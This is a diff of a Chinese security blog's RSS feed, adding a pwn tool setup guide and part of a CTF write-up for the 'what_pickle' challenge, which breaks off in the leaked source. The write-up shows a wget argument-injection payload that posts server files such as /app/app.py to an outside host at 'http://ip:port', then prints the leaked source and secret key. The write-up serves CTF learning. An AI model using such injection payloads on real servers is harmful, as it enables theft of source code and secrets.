@@ -1,4 +1,67 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>AmiaaaZ's Site</title><link>https://amiaaaz.github.io/</link><description>Recent content on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 26 Oct 2021 20:17:24 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>2021强网拟态 Wp</title><link>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</link><pubDate>Tue, 26 Oct 2021 20:17:24 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</guid><description>&lt;blockquote>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>AmiaaaZ's Site</title><link>https://amiaaaz.github.io/</link><description>Recent content on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 28 Oct 2021 00:41:15 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>pwn环境配置</title><link>https://amiaaaz.github.io/2021/10/28/pwn-env-init/</link><pubDate>Thu, 28 Oct 2021 00:41:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/28/pwn-env-init/</guid><description>&lt;p>以下为Ubutun16.04&amp;amp;py2的安装过程，其他版本命令几乎相同的~（Ubuntu20&amp;amp;py3的我也装了一个，毕竟py3是主流，技术总是向前发展的嘛~）&lt;/p>
+&lt;p>安装pip2&amp;amp;pip3&amp;amp;ipython&lt;/p>
+&lt;pre tabindex="0">&lt;code>curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
+sudo python get-pip.py
+# sudo apt-get install python3-pip
+curl https://bootstrap.pypa.io/pip/3.5/get-pip.py -o get-pip.py
+sudo python3 get-pip.py
+sudo apt-get install ipython
+&lt;/code>&lt;/pre>&lt;p>安装py2的pwntools&lt;/p>
+&lt;pre tabindex="0">&lt;code>pip2 install pathlib2 # py3无需此条
+pip2 install pwntools
+&lt;/code>&lt;/pre>&lt;p>安装GDB&amp;amp;插件&lt;/p>
+&lt;pre tabindex="0">&lt;code>sudo apt-get install git
+git clone https://github.com/pwndbg/pwndbg.git
+./setup.sh
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code># 使用peda-heap
+git clone https://github.com/Mipu94/peda-heap.git
+echo &amp;quot;source ~/peda-heap/peda.py&amp;quot; &amp;gt; ~/.gdbinit
+# 使用peda
+git clone https://github.com/longld/peda.git
+echo &amp;quot;source ~/GDB-Plugins/peda/peda.py&amp;quot; &amp;gt; ~/.gdbinit
+# 使用gef
+git clone https://github.com/hugsy/gef.git
+echo &amp;quot;source ~/gef/gef.py&amp;quot; &amp;gt; ~/.gdbinit
+# 使用pwndbg
+echo &amp;quot;source ~/pwndbg/gdbinit.py&amp;quot; &amp;gt; ~/.gdbinit
+# 自动切换脚本 https://blog.csdn.net/aptx4869_li/article/details/81566541
+&lt;/code>&lt;/pre>&lt;p>安装one_gadget&lt;/p>
+&lt;pre tabindex="0">&lt;code>sudo apt-add-repository ppa:brightbox/ruby-ng
+sudo apt-get update
+sudo apt-get install ruby2.7 ruby2.7-dev
+sudo apt-get install gem
+sudo gem install one_gadget
+&lt;/code>&lt;/pre>&lt;p>安装32位库&lt;/p>
+&lt;pre tabindex="0">&lt;code>sudo apt-get install lib32ncurses5
+sudo apt-get install lib32z1
+&lt;/code>&lt;/pre>&lt;p>安装checksec&lt;/p>
+&lt;pre tabindex="0">&lt;code>sudo apt instal checksec
+&lt;/code>&lt;/pre>&lt;p>安装seccomp-tools&lt;/p>
+&lt;pre tabindex="0">&lt;code>sudo gem install seccomp-tools
+&lt;/code>&lt;/pre>&lt;p>安装zshell&amp;amp;插件&lt;/p>
+&lt;pre tabindex="0">&lt;code>sudo apt-get install zsh
+sh -c &amp;quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&amp;quot;
+# zsh-syntax-highlighting
+git clone https://github.com/zsh-users/zsh-syntax-highlighting.git
+echo &amp;quot;source ${(q-)PWD}/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh&amp;quot; &amp;gt;&amp;gt; ${ZDOTDIR:-$HOME}/.zshrc
+source ./zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
+# zsh-autosuggestions
+git clone https://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions
+source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code># 如遇报错 error: RPC failed; result=35, HTTP code=0; fatal: The remote end hung up unexpectedly
+# 将git clone https://xxxx/xxxx.git 换为git clone git://xxxx/xxxx.git
+&lt;/code>&lt;/pre>&lt;p>安装virtualbox增强功能&lt;/p>
+&lt;pre tabindex="0">&lt;code># 遇报错 unable to access “VBox_GAS_6.0.0 iso9660”
+sudo apt-get install --reinstall linux-image-$(uname -r)
+&lt;/code>&lt;/pre>&lt;p>最后结果&lt;/p>
+&lt;p>ubuntu20+py3+zsh（应该能看出来我更喜欢这个x&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028002711973.png" alt="image-20211028002711973">&lt;/p>
+&lt;p>ubuntu16+py2&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028003012735.png" alt="image-20211028003012735">&lt;/p>
+&lt;hr>
+&lt;p>第一次装的时候直接卡在了pwntools上，后来发现原因是pip2版本过低且无法直接通过&lt;code>pip -m pip install --upgrade pip&lt;/code>进行升级，只能手动下载get-pip.py后通过py2运行来安装&lt;/p>
+&lt;p>这次配完之后最大的感触就是该换个大一点的硬盘了，512G属实绷不住我搞这么多虚拟机……&lt;/p>
+&lt;p>之后可能会抽空学一下pwn，属于是web狗卷不动了要给自己找个后路（虽然百分之九十九的概率是两个都很菜，xs），卷起来卷起来！！！&lt;/p></description></item><item><title>2021强网拟态 Wp</title><link>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</link><pubDate>Tue, 26 Oct 2021 20:17:24 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</guid><description>&lt;blockquote>
 &lt;p>web有3个都是有了包浆的原题……还有一点脑洞题，反正奇奇怪怪的&lt;/p>
 &lt;p>属于是被师傅们带飞了，所以详细的wp还是自己写一写，认真地复现一下&lt;/p>
 &lt;/blockquote>
@@ -2242,13 +2305,105 @@ df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246 xal
 &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ticket&lt;/span>
 &lt;span style="color:#75715e"># b&amp;#34;(I0\niguess_game.Ticket\nTicket\np0\n0cguess_game\ngame\np1\n0g1\n(N(S&amp;#39;curr_ticket&amp;#39;\ng0\ndtbg0\n.&amp;#34;&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+栗子3 - [巅峰极客 2021]what_pickle
+&lt;/h4>
+&lt;/summary>
+&lt;p>登录页面 任意密码均可登入，仅显示一张图片+登录时输入的密码；图片的url为/images?image=2.jpg，但是不能常规的目录穿越拿源码，当时做的时候就不会了，下面是复现&lt;/p>
+&lt;p>/images可以看到开着的debug界面&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024174438862.png" alt="image-20211024174438862">&lt;/p>
+&lt;p>能看到部分的源码，这里的图片是用的wget命令来下载本地8080端口的/image图片，所以我们尝试wget命令注入将文件外带出来&lt;/p>
+&lt;pre tabindex="0">&lt;code>/images?image=&amp;amp;argv=--post-file=/app/app.py&amp;amp;argv=--execute=http_proxy=http://ip:port
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/images?image=&amp;amp;argv=—post-file=/app/app.py&amp;amp;argv=-e http_proxy=http://ip:port
+&lt;/code>&lt;/pre>&lt;p>依次读出/app/app.py和/app/config.py&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># app.py&lt;/span>
+&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">redirect&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>
+&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">ctypes&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cdll&lt;/span>
+&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">config&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">user&lt;/span>
+&lt;span style="color:#111">cdll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">LoadLibrary&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./readflag.so&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">config&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>
+&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#111">))&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Unpickler&lt;/span>&lt;span style="color:#111">):&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;config&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#34;__&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">UnpicklingError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global &amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39; is forbidden&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
+&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;Helper function analogous to pickle.loads().&amp;#34;&amp;#34;&amp;#34;&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">load&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/index&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">):&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">login&lt;/span>&lt;span style="color:#111">():&lt;/span>
+&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/home&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">():&lt;/span>
+&lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
+&lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">info&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;span style="color:#111">Jpg_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Jpg_id&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/images&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">images&lt;/span>&lt;span style="color:#111">():&lt;/span>
+&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;wget&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
+&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getlist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;argv&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">true_argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">startswith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;-&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#d88200">&amp;#39;--&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">]&lt;/span>
+&lt;span style="color:#111">image&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;image&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
+&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">extend&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">true_argv&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">extend&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#d88200">&amp;#34;-q&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;-O&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;-&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
+&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://127.0.0.1:8080/&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">image&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">image_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">stdout&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PIPE&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">stderr&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PIPE&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">image_data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">stdout&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">debug&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">80&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># config.py&lt;/span>
+&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;On_You_fffffinddddd_thi3_kkkkkkeeEEy&amp;#34;&lt;/span>
+&lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;no&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">():&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
+&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">username&lt;/span>
+&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">backdoor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">):&lt;/span>
